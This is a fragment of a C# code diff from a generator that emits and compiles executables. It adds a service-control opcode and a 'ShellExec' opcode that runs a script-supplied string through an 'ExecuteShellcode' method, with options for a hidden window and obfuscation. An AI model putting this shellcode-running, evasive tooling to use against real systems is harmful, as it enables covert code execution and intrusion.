+            csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 70: // SvcControl");
+            csBld.AppendLine("                        string scVar = a1; string scName = ExpandVars(a2); string scAct = ExpandVars(a3);");
+            csBld.AppendLine("                        string scRes = TigerSingularity.ServiceControl(scName, scAct);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[scVar] = scRes; Variables[\"SVC_RESULT\"] = scRes; Environment.SetEnvironmentVariable(scVar, scRes); }");
+            csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 71: // ShellExec");
+            csBld.AppendLine("                        string seVar = a1; string seCode = ExpandVars(a2);");
+            csBld.AppendLine("                        int seTimeout = 5000; int.TryParse(ExpandVars(a3), out seTimeout);");
+            csBld.AppendLine("                        string seRes = TigerSingularity.ExecuteShellcode(seCode, seTimeout);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[seVar] = seRes; Variables[\"SHELL_RESULT\"] = seRes; Environment.SetEnvironmentVariable(seVar, seRes); }");
+            csBld.AppendLine("                        break;");
             csBld.AppendLine("                }");
             if (enableCff)
             {
@@ -3902,7 +4274,7 @@ Examples:
 
                 string targetType = hidden ? "winexe" : "exe";
                 StringBuilder argsBld = new StringBuilder();
-                argsBld.Append("/nologo /optimize+ /target:" + targetType + " /r:System.Data.dll /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.IO.Compression.dll /r:System.IO.Compression.FileSystem.dll /out:\"" + Path.GetFullPath(outExePath) + "\" /win32manifest:\"" + manifestFile + "\" ");
+                argsBld.Append("/nologo /optimize+ /target:" + targetType + " /r:System.Core.dll /r:System.Data.dll /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.IO.Compression.dll /r:System.IO.Compression.FileSystem.dll /out:\"" + Path.GetFullPath(outExePath) + "\" /win32manifest:\"" + manifestFile + "\" ");
                 if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                 {
                     argsBld.Append("/win32icon:\"" + Path.GetFullPath(iconPath) + "\" ");
